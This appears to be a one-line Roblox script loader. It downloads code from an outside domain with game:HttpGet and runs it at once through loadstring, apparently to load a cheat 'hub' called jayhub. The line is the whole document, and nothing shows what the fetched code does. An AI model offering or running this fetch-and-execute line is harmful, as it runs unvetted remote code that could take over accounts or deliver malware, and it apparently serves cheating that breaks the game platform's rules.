loadstring(game:HttpGet("https://jack1214060.xyz/jayhub",true))()
